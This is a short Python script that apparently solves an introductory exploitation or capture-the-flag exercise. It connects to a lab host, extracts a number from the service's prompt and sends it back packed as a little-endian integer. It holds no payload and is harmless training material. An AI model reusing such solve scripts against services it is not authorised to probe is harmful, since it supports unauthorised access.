#!/usr/bin/env python3
import struct
import sys
import re
from pwnpy.pwn import *

sock = connect_to('10.10.10.4', 2999)

data = sock.recv(1024)
expected = int(re.search(b'\'(?P<value>\d+)\'', data).group('value'))

buf = b''
buf += struct.pack('<i', expected)

sock.send(buf)
print(sock.recv(1024))
